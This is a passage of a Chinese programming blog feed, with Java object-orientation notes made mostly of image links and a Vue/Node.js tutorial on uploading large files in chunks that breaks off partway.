alt="image-20230502181152461"></p><p><img src="https://gitee.com/hisai/image-bed/raw/master/Java/image-20230502190324208.png" alt="image-20230502190324208"></p><p><img src="https://gitee.com/hisai/image-bed/raw/master/Java/image-20230502185715124.png" alt="image-20230502185715124"></p><p><img src="https://gitee.com/hisai/image-bed/raw/master/Java/image-20230502185838696.png" alt="image-20230502185838696"></p><p><img src="https://gitee.com/hisai/image-bed/raw/master/Java/image-20230502185939640.png" alt="image-20230502185939640"></p><h2 id="对象-Class"><a href="#对象-Class" class="headerlink" title="对象 Class"></a>对象 Class</h2><h3 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h3><p><img src="https://gitee.com/hisai/image-bed/raw/master/Java/image-20230502190844160.png" alt="image-20230502190844160"></p><p><img src="https://gitee.com/hisai/image-bed/raw/master/image-20230507113557953.png" alt="image-20230502190906214"> </p><p><img src="https://gitee.com/hisai/image-bed/raw/master/Java/image-20230502191339863.png" alt="image-20230502191339863">                                                                                </p><h3 id="成员属性-x2F-变量"><a href="#成员属性-x2F-变量" class="headerlink" title="成员属性&#x2F;变量"></a>成员属性&#x2F;变量</h3><p><img src="https://gitee.com/hisai/image-bed/raw/master/image-20230507095631401.png" alt="image-20230507095631401"></p><p><img src="https://gitee.com/hisai/image-bed/raw/master/image-20230507095820976.png" alt="image-20230507095820976"></p><h3 id="成员方法"><a href="#成员方法" class="headerlink" title="成员方法"></a>成员方法</h3><p><img src="https://gitee.com/hisai/image-bed/raw/master/image-20230507102615367.png" alt="image-20230507102615367"></p><h3 id="方法重写"><a href="#方法重写" class="headerlink" title="方法重写"></a>方法重写</h3><p><img src="https://gitee.com/hisai/image-bed/raw/master/image-20230507100100568.png" alt="image-20230507100100568"> </p><p><strong>只有被添加到虚方法表（非static 非private 非fina）的方法才能被重写！！！</strong></p><p><img src="https://gitee.com/hisai/image-bed/raw/master/image-20230507100446354.png" alt="image-20230507100446354"></p><p><img src="https://gitee.com/hisai/image-bed/raw/master/image-20230507103104320.png" alt="image-20230507103104320"></p><h3 id="多态"><a href="#多态" class="headerlink" title="多态"></a>多态</h3><p><img src="https://gitee.com/hisai/image-bed/raw/master/image-20230507104613488.png" alt="image-20230507104613488"><img src="https://gitee.com/hisai/image-bed/raw/master/image-20230507104446481.png" alt="image-20230507104446481"></p><p><img src="https://gitee.com/hisai/image-bed/raw/master/image-20230507105810750.png" alt="image-20230507105810750"></p><p><img src="https://gitee.com/hisai/image-bed/raw/master/image-20230507105028775.png" alt="image-20230507105028775"></p><p><img src="https://gitee.com/hisai/image-bed/raw/master/image-20230507105123295.png" alt="image-20230507105123295"></p><p><img src="https://gitee.com/hisai/image-bed/raw/master/image-20230507110213586.png" alt="image-20230507110213586"></p><p><img src="https://gitee.com/hisai/image-bed/raw/master/image-20230507110326766.png" alt="image-20230507110326766"></p><p><img src="https://gitee.com/hisai/image-bed/raw/master/image-20230507110642147.png" alt="image-20230507110642147"></p><h2 id="Package-包"><a href="#Package-包" class="headerlink" title="Package 包"></a>Package 包</h2><p><img src="https://gitee.com/hisai/image-bed/raw/master/image-20230507112205582.png" alt="image-20230507112205582"></p><p><img src="https://gitee.com/hisai/image-bed/raw/master/image-20230507112322801.png" alt="image-20230507112322801"></p><p><img src="https://gitee.com/hisai/image-bed/raw/master/image-20230507112358553.png" alt="image-20230507112358553"></p><h2 id="final"><a href="#final" class="headerlink" title="final"></a>final</h2><p><img src="https://gitee.com/hisai/image-bed/raw/master/image-20230507112745937.png" alt="image-20230507112745937"></p><p><img src="https://gitee.com/hisai/image-bed/raw/master/image-20230507113055721.png" alt="image-20230507113055721"></p><h2 id="代码块"><a href="#代码块" class="headerlink" title="代码块"></a>代码块</h2><p><strong>局部和构造 逐渐被淘汰</strong></p><p><img src="https://gitee.com/hisai/image-bed/raw/master/image-20230507115117406.png" alt="image-20230507115117406"></p><p><img src="https://gitee.com/hisai/image-bed/raw/master/image-20230507115121417.png" alt="image-20230507115121417"></p><p><img src="https://gitee.com/hisai/image-bed/raw/master/image-20230507115125703.png" alt="image-20230507115125703"></p><h2 id="抽象类-abstract"><a href="#抽象类-abstract" class="headerlink" title="抽象类 abstract"></a>抽象类 abstract</h2><p><img src="https://gitee.com/hisai/image-bed/raw/master/image-20230507120331347.png" alt="image-20230507120331347"></p><h2 id="接口-interface"><a href="#接口-interface" class="headerlink" title="接口 interface"></a>接口 interface</h2><p><img src="https://gitee.com/hisai/image-bed/raw/master/image-20230507132209317.png" alt="image-20230507132209317"></p><p><img src="https://gitee.com/hisai/image-bed/raw/master/image-20230507132302706.png" alt="image-20230507132302706"></p><p><img src="https://gitee.com/hisai/image-bed/raw/master/image-20230507141022646.png" alt="image-20230507141022646"></p><p><img src="https://gitee.com/hisai/image-bed/raw/master/image-20230507142459667.png" alt="image-20230507142459667"> </p><p><img src="https://gitee.com/hisai/image-bed/raw/master/image-20230507142854257.png" alt="image-20230507142854257"></p><h2 id="GUI-操作界面"><a href="#GUI-操作界面" class="headerlink" title="GUI 操作界面"></a>GUI 操作界面</h2><p><img src="https://gitee.com/hisai/image-bed/raw/master/Java/image-20230501165202098.png" alt="image-20230501165202098"></p><h3 id="JFrame-x2F-JMenuBar"><a href="#JFrame-x2F-JMenuBar" class="headerlink" title="JFrame &#x2F; JMenuBar"></a>JFrame &#x2F; JMenuBar</h3><p><img src="https://gitee.com/hisai/image-bed/raw/master/Java/image-20230501165423493.png" alt="image-20230501165423493"></p><p><img src="https://gitee.com/hisai/image-bed/raw/master/Java/image-20230501165507455.png" alt="image-20230501165507455"></p><h3 id="JLabel"><a href="#JLabel" class="headerlink" title="JLabel"></a>JLabel</h3><p><img src="https://gitee.com/hisai/image-bed/raw/master/Java/image-20230501165536102.png" alt="image-20230501165536102"></p><p><img src="https://gitee.com/hisai/image-bed/raw/master/Java/image-20230501191804096.png" alt="image-20230501191804096"></p><h3 id="相对路径"><a href="#相对路径" class="headerlink" title="相对路径"></a>相对路径</h3><p><strong>引入路径： 相对路径  ..&#x2F; 或 ..\ 或者  去除多余文件（默认就是从根目录开始找的！！）</strong></p><p><img src="https://gitee.com/hisai/image-bed/raw/master/Java/image-20230501195425626.png" alt="image-20230501195425626"></p><p><img src="https://gitee.com/hisai/image-bed/raw/master/Java/image-20230501195653091.png" alt="image-20230501195653091"></p><p><img src="https://gitee.com/hisai/image-bed/raw/master/Java/image-20230501200642782.png" alt="image-20230501200642782"></p><p><img src="https://gitee.com/hisai/image-bed/raw/master/Java/image-20230501200658985.png" alt="image-20230501200658985"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Idea-安装破解&quot;&gt;&lt;a href=&quot;#Idea-安装破解&quot; class=&quot;headerlink&quot; title=&quot;Idea 安装破解&quot;&gt;&lt;/a&gt;Idea 安装破解&lt;/h2&gt;&lt;h3 id=&quot;方法一：无限重置&quot;&gt;&lt;a href=&quot;#方法一：无限重置&quot; class=&quot;</summary>
      
    
    
    
    <category term="Java" scheme="https://hisai3.github.io/hisai3.github.io/categories/Java/"/>
    
    
    <category term="Java" scheme="https://hisai3.github.io/hisai3.github.io/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>大文件上传</title>
    <link href="https://hisai3.github.io/hisai3.github.io/2023/02/03/%E5%A4%A7%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    <id>https://hisai3.github.io/hisai3.github.io/2023/02/03/%E5%A4%A7%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</id>
    <published>2023-02-03T06:31:31.000Z</published>
    <updated>2023-02-03T07:10:36.290Z</updated>
    
    <content type="html"><![CDATA[<h3 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h3><p>服务端需要负责接受这些切片，并在接收到所有切片后<code>合并</code>切片</p><p>这里又引伸出两个问题</p><ol><li>何时合并切片，即切片什么时候传输完成</li><li>如何合并切片</li></ol><p>第一个问题需要前端进行配合，前端在每个切片中都携带切片最大数量的信息，当服务端接受到这个数量的切片时自动合并，也可以额外发一个请求主动通知服务端进行切片的合并</p><p>第二个问题，具体如何合并切片呢？这里可以使用 nodejs 的 读写流（readStream&#x2F;writeStream），将所有切片的流传输到最终文件的流里</p><p><code>talk is cheap,show me the code</code>，接着我们用代码实现上面的思路</p><h2 id="前端部分"><a href="#前端部分" class="headerlink" title="前端部分"></a>前端部分</h2><p>前端使用 Vue 作为开发框架，对界面没有太大要求，原生也可以，考虑到美观使用 element-ui 作为 UI 框架</p><h3 id="上传控件"><a href="#上传控件" class="headerlink" title="上传控件"></a>上传控件</h3><p>首先创建选择文件的控件，监听 change 事件以及上传按钮</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">   <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> @<span class="attr">change</span>=<span class="string">&quot;handleFileChange&quot;</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">el-button</span> @<span class="attr">click</span>=<span class="string">&quot;handleUpload&quot;</span>&gt;</span>上传<span class="tag">&lt;/<span class="name">el-button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="attr">data</span>: <span class="function">() =&gt;</span> (&#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="attr">container</span>: &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="attr">file</span>: <span class="literal">null</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  &#125;),</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="attr">methods</span>: &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">     <span class="title function_">handleFileChange</span>(<span class="params">e</span>) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="keyword">const</span> [file] = e.<span class="property">target</span>.<span class="property">files</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="keyword">if</span> (!file) <span class="keyword">return</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="title class_">Object</span>.<span class="title function_">assign</span>(<span class="variable language_">this</span>.<span class="property">$data</span>, <span class="variable language_">this</span>.<span class="property">$options</span>.<span class="title function_">data</span>());</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="variable language_">this</span>.<span class="property">container</span>.<span class="property">file</span> = file;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    &#125;,</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">async</span> <span class="title function_">handleUpload</span>(<span class="params"></span>) &#123;&#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">&#125;;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p><img src="https://user-gold-cdn.xitu.io/2020/1/7/16f7ff98adb6bcdd?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="img"></p><h3 id="请求逻辑"><a href="#请求逻辑" class="headerlink" title="请求逻辑"></a>请求逻辑</h3><p>考虑到通用性，这里没有用第三方的请求库，而是用原生 XMLHttpRequest 做一层简单的封装来发请求</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">request</span>(<span class="params">&#123;</span></span><br><span class="line"><span class="params">      url,</span></span><br><span class="line"><span class="params">      method = <span class="string">&quot;post&quot;</span>,</span></span><br><span class="line"><span class="params">      data,</span></span><br><span class="line"><span class="params">      headers = &#123;&#125;,</span></span><br><span class="line"><span class="params">      requestList</span></span><br><span class="line"><span class="params">    &#125;</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function"><span class="params">resolve</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">        xhr.<span class="title function_">open</span>(method, url);</span><br><span class="line">        <span class="title class_">Object</span>.<span class="title function_">keys</span>(headers).<span class="title function_">forEach</span>(<span class="function"><span class="params">key</span> =&gt;</span></span><br><span class="line">          xhr.<span class="title function_">setRequestHeader</span>(key, headers[key])</span><br><span class="line">        );</span><br><span class="line">        xhr.<span class="title function_">send</span>(data);</span><br><span class="line">        xhr.<span class="property">onload</span> = <span class="function"><span class="params">e</span> =&gt;</span> &#123;</span><br><span class="line">          <span class="title function_">resolve</span>(&#123;</span><br><span class="line">            <span class="attr">data</span>: e.<span class="property">target</span>.<span class="property">response</span></span><br><span class="line">          &#125;);</span><br><span class="line">        &#125;;</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="上传切片"><a href="#上传切片" class="headerlink" title="上传切片"></a>上传切片</h3><p>接着实现比较重要的上传功能，上传需要做两件事</p><ul><li>对文件进行切片</li><li>将切片传输给服务端</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> @<span class="attr">change</span>=<span class="string">&quot;handleFileChange&quot;</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">el-button</span> @<span class="attr">click</span>=<span class="string">&quot;handleUpload&quot;</span>&gt;</span>上传<span class="tag">&lt;/<span class="name">el-button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">+ <span class="keyword">const</span> <span class="variable constant_">SIZE</span> = <span class="number">10</span> * <span class="number">1024</span> * <span class="number">1024</span>; <span class="comment">// 切片大小</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="attr">data</span>: <span class="function">() =&gt;</span> (&#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="attr">container</span>: &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="attr">file</span>: <span class="literal">null</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    &#125;，</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">+   <span class="attr">data</span>: []</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  &#125;),</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="attr">methods</span>: &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="title function_">request</span>(<span class="params"></span>) &#123;&#125;,</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="title function_">handleFileChange</span>(<span class="params"></span>) &#123;&#125;,</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">+    <span class="comment">// 生成文件切片</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">+    <span class="title function_">createFileChunk</span>(<span class="params">file, size = SIZE</span>) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">+     <span class="keyword">const</span> fileChunkList = [];</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">+      <span class="keyword">let</span> cur = <span class="number">0</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">+      <span class="keyword">while</span> (cur &lt; file.<span class="property">size</span>) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">+        fileChunkList.<span class="title function_">push</span>(&#123; <span class="attr">file</span>: file.<span class="title function_">slice</span>(cur, cur + size) &#125;);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">+        cur += size;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">+      &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">+      <span class="keyword">return</span> fileChunkList;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">+    &#125;,</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">+   <span class="comment">// 上传切片</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">+    <span class="keyword">async</span> <span class="title function_">uploadChunks</span>(<span class="params"></span>) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">+      <span class="keyword">const</span> requestList = <span class="variable language_">this</span>.<span class="property">data</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">+        .<span class="title function_">map</span>(<span class="function">(<span class="params">&#123; chunk，hash &#125;</span>) =&gt;</span> &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">+          <span class="keyword">const</span> formData = <span class="keyword">new</span> <span class="title class_">FormData</span>();</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">+          formData.<span class="title function_">append</span>(<span class="string">&quot;chunk&quot;</span>, chunk);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">+          formData.<span class="title function_">append</span>(<span class="string">&quot;hash&quot;</span>, hash);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">+          formData.<span class="title function_">append</span>(<span class="string">&quot;filename&quot;</span>, <span class="variable language_">this</span>.<span class="property">container</span>.<span class="property">file</span>.<span class="property">name</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">+          <span class="keyword">return</span> &#123; formData &#125;;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">+        &#125;)</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">+        .<span class="title function_">map</span>(<span class="keyword">async</span> (&#123; formData &#125;) =&gt;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">+          <span class="variable language_">this</span>.<span class="title function_">request</span>(&#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">+            <span class="attr">url</span>: <span class="string">&quot;http://localhost:3000&quot;</span>,</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">+            <span class="attr">data</span>: formData</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">+          &#125;)</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">+        );</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">+      <span class="keyword">await</span> <span class="title class_">Promise</span>.<span class="title function_">all</span>(requestList); <span class="comment">// 并发切片</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">+    &#125;,</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">+    <span class="keyword">async</span> <span class="title function_">handleUpload</span>(<span class="params"></span>) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">+      <span class="keyword">if</span> (!<span class="variable language_">this</span>.<span class="property">container</span>.<span class="property">file</span>) <span class="keyword">return</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">+      <span class="keyword">const</span> fileChunkList = <span class="variable language_">this</span>.<span class="title function_">createFileChunk</span>(<span class="variable language_">this</span>.<span class="property">container</span>.<span class="property">file</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">+      <span class="variable language_">this</span>.<span class="property">data</span> = fileChunkList.<span class="title function_">map</span>(<span class="function">(<span class="params">&#123; file &#125;，index</span>) =&gt;</span> (&#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">+        <span class="attr">chunk</span>: file,</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">+        <span class="attr">hash</span>: <span class="variable language_">this</span>.<span class="property">container</span>.<span class="property">file</span>.<span class="property">name</span> + <span class="string">&quot;-&quot;</span> + index <span class="comment">// 文件名 + 数组下标</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">+      &#125;));</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">+      <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="title function_">uploadChunks</span>();</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">+    &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">&#125;;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>当点击上传按钮时，调用 <code>createFileChunk</code> 将文件切片，切片数量通过文件大小控制，这里设置 10MB，也就是说 100 MB 的文件会被分成 10 个切片</p><p>createFileChunk 内使用 while 循环和 slice 方法将切片放入 <code>fileChunkList</code> 数组中返回</p><p>在生成文件切片时，需要给每个切片一个标识作为 hash，这里暂时使用<code>文件名 + 下标</code>，这样后端可以知道当前切片是第几个切片，用于之后的合并切片</p><p>随后调用 <code>uploadChunks</code> 上传所有的文件切片，将文件切片，切片 hash，以及文件名放入 FormData 中，再调用上一步的 <code>request</code> 函数返回一个 proimise，最后调用 Promise.all 并发上传所有的切片</p><h3 id="发送合并请求"><a href="#发送合并请求" class="headerlink" title="发送合并请求"></a>发送合并请求</h3><p>这里使用整体思路中提到的第二种合并切片的方式，即前端主动通知服务端进行合并，所以前端还需要额外发请求，服务端接受到这个请求时主动合并切片</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;input type=&quot;file&quot; @change=&quot;handleFileChange&quot; /&gt;</span><br><span class="line">    &lt;el-button @click=&quot;handleUpload&quot;&gt;上传&lt;/el-button&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">export default &#123;</span><br><span class="line">  data: () =&gt; (&#123;</span><br><span class="line">    container: &#123;</span><br><span class="line">      file: null</span><br><span class="line">    &#125;,</span><br><span class="line">    data: []</span><br><span class="line">  &#125;),</span><br><span class="line">  methods: &#123;</span><br><span class="line">    request() &#123;&#125;,</span><br><span class="line">    handleFileChange() &#123;&#125;,</span><br><span class="line">    createFileChunk() &#123;&#125;,</span><br><span class="line">    // 上传切片，同时过滤已上传的切片</span><br><span class="line">    async uploadChunks() &#123;</span><br><span class="line">      const requestList = this.data</span><br><span class="line">        .map((&#123; chunk，hash &#125;) =&gt; &#123;</span><br><span class="line">          const formData = new FormData();</span><br><span class="line">          formData.append(&quot;chunk&quot;, chunk);</span><br><span class="line">          formData.append(&quot;hash&quot;, hash);</span><br><span class="line">          formData.append(&quot;filename&quot;, this.container.file.name);</span><br><span class="line">          return &#123; formData &#125;;</span><br><span class="line">        &#125;)</span><br><span class="line">        .map(async (&#123; formData &#125;) =&gt;</span><br><span class="line">          this.request(&#123;</span><br><span class="line">            url: &quot;http://localhost:3000&quot;,</span><br><span class="line">            data: formData</span><br><span class="line">          &#125;)</span><br><span class="line">        );</span><br><span class="line">      await Promise.all(requestList);</span><br><span class="line">+      // 合并切片</span><br><span class="line">+     await this.mergeRequest();</span><br><span class="line">    &#125;,</span><br><span class="line">+    async mergeRequest() &#123;</span><br><span class="line">+      await this.request(&#123;</span><br><span class="line">+        url: &quot;http://localhost:3000/merge&quot;,</span><br><span class="line">+        headers: &#123;</span><br><span class="line">+          &quot;content-type&quot;: &quot;application/json&quot;</span><br><span class="line">+        &#125;,</span><br><span class="line">+        data: JSON.stringify(&#123;</span><br><span class="line">+          filename: this.container.file.name</span><br><span class="line">+        &#125;)</span><br><span class="line">+      &#125;);</span><br><span class="line">+    &#125;,    </span><br><span class="line">    async handleUpload() &#123;&#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h2 id="服务端部分"><a href="#服务端部分" class="headerlink" title="服务端部分"></a>服务端部分</h2><p>简单使用 http 模块搭建服务端</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">const http = require(&quot;http&quot;);</span><br><span class="line">const server = http.createServer();</span><br><span class="line"></span><br><span class="line">server.on(&quot;request&quot;, async (req, res) =&gt; &#123;</span><br><span class="line">  res.setHeader(&quot;Access-Control-Allow-Origin&quot;, &quot;*&quot;);</span><br><span class="line">  res.setHeader(&quot;Access-Control-Allow-Headers&quot;, &quot;*&quot;);</span><br><span class="line">  if (req.method === &quot;OPTIONS&quot;) &#123;</span><br><span class="line">    res.status = 200;</span><br><span class="line">    res.end();</span><br><span class="line">    return;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">server.listen(3000, () =&gt; console.log(&quot;正在监听 3000 端口&quot;));</span><br></pre></td></tr></table></figure><h3 id="接受切片"><a href="#接受切片" class="headerlink" title="接受切片"></a>接受切片</h3><p>使用 